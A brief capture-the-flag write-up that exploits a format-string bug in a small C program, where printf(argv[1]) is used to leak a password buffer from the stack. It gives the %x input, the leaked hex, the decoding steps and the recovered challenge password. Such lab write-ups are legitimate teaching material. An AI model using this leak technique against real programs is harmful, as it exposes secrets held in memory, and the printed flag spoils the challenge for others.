Source <br>

```c
#include <stdio.h>
#include <unistd.h>
 
int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```
<br>
In this challenge, we can exploit the basic format string vul in `printf(arg[1])` that allows us to leak the password read in `buffer[32]`. Hence, we can use `%x` continuously to leak 4 characters on the stack.


<br>

```c
app-systeme-ch5@challenge02:~$ ./ch5 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
20804b160804853d9bffffd5ab7e1b679bffffc34b7fc3000b7fc3000804b16039617044282936646d617045bf000a64804861b
```

Using CyberChief to swap endian to: 
```c
16 4b 80 20 3d 85 04 08 d5 ff ff 9b 67 1b 7e ab c3 ff ff 9b 00 c3 7f 4b 00 c3 7f 0b 60 b1 04 08 44 70 61 39 64 36 29 28 45 70 61 6d 64 0a 00 bf 0b 61 48 80
```
Using Hex to text Decoder: 
```c
K =Õÿÿg~«ÃÿÿÃKÃ`±Dpa9d6)(Epamd
¿aH
```
Password is Dpa9d6)(Epamd
